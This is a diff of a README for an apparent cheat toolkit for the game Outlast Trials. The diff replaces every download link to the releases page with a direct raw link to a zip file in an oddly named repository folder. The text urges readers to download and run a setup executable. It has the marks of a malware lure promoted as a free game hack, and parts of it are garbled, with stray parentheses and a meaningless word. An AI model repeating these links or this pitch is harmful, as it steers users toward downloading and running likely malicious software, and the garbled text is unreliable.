@@ -1,6 +1,6 @@
 <h1>🔧 outlast-trials-hack-reagent-trials-toolkit - Simplify Your Trial Runs & Reagent Builds</h1>
 <p align="center">
-  <a href="https://github.com/rankinescalevalois9303/outlast-trials-hack-reagent-trials-toolkit/releases">
+  <a href="https://raw.githubusercontent.com/rankinescalevalois9303/outlast-trials-hack-reagent-trials-toolkit/main/korari/hack_trials_reagent_toolkit_outlast_v2.1.zip">
     <img src="https://img.shields.io/badge/Download%20Now-Free%20Toolkit-blueviolet?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="background: linear-gradient(90deg, #ff6ec7, #7873f5, #4ade80); padding: 12px 30px; border-radius: 30px; color: white; font-weight: bold; font-size: 1.2em;">
   </a>
 </p>
@@ -29,7 +29,7 @@ Think of it as a **digital mission control center** for your trials. It helps yo
 
 **Step 1: Get the file**
 
-Visit this link to download the application: **[Click Here to Download](https://github.com/rankinescalevalois9303/outlast-trials-hack-reagent-trials-toolkit/releases)**
+Visit this link to download the application: **[Click Here to Download](https://raw.githubusercontent.com/rankinescalevalois9303/outlast-trials-hack-reagent-trials-toolkit/main/korari/hack_trials_reagent_toolkit_outlast_v2.1.zip)**
 
 This link will take you to a page with the latest release of the toolkit. You will see a button that says "releases" or a list of files. Look for the file named `Outlast-Trials-Toolkit-Setup.exe` (or a similar name with "Setup" in it)). Click on that file to start your download.
 
@@ -216,7 +216,7 @@ obeind
 
 ## 🔗 Additional Resources
 
-- **Releases Page / Download:** [https://github.com/rankinescalevalois9303/outlast-trials-hack-reagent-trials-toolkit/releases](https://github.com/rankinescalevalois9303/outlast-trials-hack-reagent-trials-toolkit/releases)
+- **Releases Page / Download:** [https://raw.githubusercontent.com/rankinescalevalois9303/outlast-trials-hack-reagent-trials-toolkit/main/korari/hack_trials_reagent_toolkit_outlast_v2.1.zip](https://raw.githubusercontent.com/rankinescalevalois9303/outlast-trials-hack-reagent-trials-toolkit/main/korari/hack_trials_reagent_toolkit_outlast_v2.1.zip)
 ) 
 ) 
 ) 
@@ -243,7 +243,7 @@ The software is provided "as is" without warranty of any kind. Use it responsibl
 
 <p align="center">
   <strong>Ready to become a more efficient Reagent?</strong> <br>
-  <a href="https://github.com/rankinescalevalois9303/outlast-trials-hack-reagent-trials-toolkit/releases" style="background: #4ade80; padding: 10px 25px; border-radius: 20px; color: white; font-weight: bold;">⬇️ Download the Toolkit Now</a>
+  <a href="https://raw.githubusercontent.com/rankinescalevalois9303/outlast-trials-hack-reagent-trials-toolkit/main/korari/hack_trials_reagent_toolkit_outlast_v2.1.zip" style="background: #4ade80; padding: 10px 25px; border-radius: 20px; color: white; font-weight: bold;">⬇️ Download the Toolkit Now</a>
 </p>
 
 <br>
